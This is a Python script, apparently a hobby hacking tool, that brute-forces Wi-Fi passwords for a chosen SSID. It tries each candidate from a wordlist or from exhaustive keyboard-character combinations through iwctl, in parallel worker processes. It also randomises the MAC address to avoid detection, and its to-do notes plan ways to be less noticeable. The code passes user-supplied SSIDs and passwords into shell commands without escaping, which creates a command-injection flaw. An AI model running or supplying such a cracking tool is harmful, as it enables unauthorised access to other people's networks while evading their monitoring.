import os
import typer
import time
import rich
from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn, SpinnerColumn
import string
import itertools
import subprocess
from multiprocessing import Pool


app = typer.Typer()


def generate_brute_force(min_length=1, max_length=8):
    """
    Generate all possible passwords using English keyboard characters.
    Includes: letters, digits, and special characters
    All characters on an English keyboard
    """
    characters = string.ascii_letters + string.digits + string.punctuation
    
    for length in range(min_length, max_length + 1):
        for combination in itertools.product(characters, repeat=length):
            yield ''.join(combination)


def check_password(args):
    """
    Fast password checker - runs in a worker process.
    Returns (password, success, False) where False means "keep searching"
    Returns (password, True, True) when password is found
    """
    password, target_ssid = args
    try:
        # Connect with timeout
        result = subprocess.run(
            f"iwctl station wlan0 connect {target_ssid} password {password}",
            shell=True,
            capture_output=True,
            timeout=3,
            text=True
        )
        
        # Quick check without sleep for speed
        check = subprocess.run(
            "iwctl station wlan0 show",
            shell=True,
            capture_output=True,
            timeout=2,
            text=True
        )
        
        output = check.stdout.lower()
        
        # Check if connected
        if f"connected network: {target_ssid.lower()}" in output or \
           (target_ssid in output and "connected" in output):
            return (password, True, True)
        else:
            return (password, False, False)
    except Exception as e:
        return (password, False, False)


def passbrute():

    # Make mac changing simpler, using the macchanger thing from yay (pacman)
    class mac:
        def rand():  # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 down")
            time.sleep(0.002)
            os.system("sudo macchanger -r wlan0")
            time.sleep(0.002)
            os.system("sudo ip link set wlan0 up")
        
        def perm(): # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 down")
            time.sleep(0.002)
            os.system("sudo macchanger -p wlan0")
            time.sleep(0.002)
            os.system("sudo ip link set wlan0 up")   
        
        def check(): # pyright: ignore[reportSelfClsParameterName]
            os.system("macchanger --show wlan0")

    class net:
        def down(): # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 down")

        def up(): # pyright: ignore[reportSelfClsParameterName]
            os.system("sudo ip link set wlan0 up")

    typer.echo("Running in passbrute mode...")
    
    time.sleep(1)

    net.down() # pyright: ignore[reportAttributeAccessIssue]
    mac_change_preference = input("Do you want to change your MAC address? (y/n): ").strip()
    mac_change_preference_bool = False

    time.sleep(1)

    if mac_change_preference.lower() == 'y':
        typer.echo("MAC address will change every attempt...")
        mac.rand() # pyright: ignore[reportAttributeAccessIssue]
        mac_change_preference_bool = True
        typer.echo("Successfully changed MAC address!")
    
    time.sleep(1)
    
    mac.check() #    pyright: ignore[reportAttributeAccessIssue]
    input("Just in-case, double-check your MAC address. Press any key to continue, ^C to abort...")
    time.sleep(1)

    typer.echo("Wait.")
    
    time.sleep(1)

    os.system("iwctl station wlan0 scan")

    # Pretend there's a loading thing here via rich
    typer.echo("Wait.")
    time.sleep(3)
    
    os.system("iwctl station wlan0 get-networks")

    target_ssid = input("Type target SSID: ")
    time.sleep(1)
    print("Type path to word list (none will do random from minimum 8 characters): ")
    wordlist_name = input("Wordlist name (wordlists can be stored in src/modules/passbrute/word_lists/): ").strip()
    
    use_brute_force = False
    passwlist = []
    
    if not wordlist_name:
        # Empty input - use brute force
        typer.echo("No wordlist provided. Using brute force mode...")
        use_brute_force = True
    else:
        wordlist_path = os.path.join("src/modules/passbrute/word_lists", wordlist_name)
        
        if not os.path.exists(wordlist_path):
            print(f"Error: Wordlist file not found at {wordlist_path}")
            fallback = input("Use brute force instead? (y/n): ").strip().lower()
            if fallback == 'y':
                use_brute_force = True
            else:
                typer.echo("Aborting...")
                return
        else:
            print("File found!")
            with open(wordlist_path, 'r', encoding="utf-8") as f:
                passwlist = [line.strip() for line in f]
                # Make this remove empty lines and spaces, also make |>> text<<| a comment in the wordlist file so that you can add comments to the wordlist file and it will ignore them.
                passwlist = [line.strip() for line in passwlist if line.strip() and not (line.startswith("|>> ") and line.endswith(" <<|"))]

    if use_brute_force:
        min_len = int(input("Minimum password length (default 1): ") or 1)
        max_len = int(input("Maximum password length (default 8): ") or 8)
        password_generator = generate_brute_force(min_len, max_len)
    else:
        password_generator = passwlist

    passw = ""
    
    # Use multiprocessing for parallel password attempts
    try:
        # Determine number of cores - use 4 to avoid overwhelming the system
        num_cores = min(4, os.cpu_count() or 4)
        
        with Pool(processes=num_cores) as pool:
            # Create args list: (password, target_ssid) pairs
            args_list = [(pwd, target_ssid) for pwd in password_generator]
            
            # Use imap_unordered for fastest results (doesn't maintain order)
            for password, success, _ in pool.imap_unordered(check_password, args_list, chunksize=1):
                if success:
                    print(f"✅ Crack'd! Password is: {password}")
                    passw = password
                    pool.terminate()
                    break
                else:
                    print(f"❌ FUCK, Tried password: {password}")
    except KeyboardInterrupt:
        print("\nBrute force interrupted by user")
        pool.terminate() 
    except Exception as e:
        print(f"Error during brute force: {e}")
        return
    
    print(passw)

    # Return to original MAC address
    mac.perm() # pyright: ignore[reportAttributeAccessIssue]
    # Use successfully cracked password to connect to the network
    os.system(f"iwctl station wlan0 connect {target_ssid} password {passw} ")
    
    """
        TO-DO LIST
        - Make the word list mode
        - Make random mode (min 8 char)
        - Make time-out -> The longer you're there, the more obvious you are
        - Don't use -r on macchanger and make them even more random
        - Polish
        - Add error checking
        - Make it more interactive
        
        Should be working by W9 but not close to polished
    """

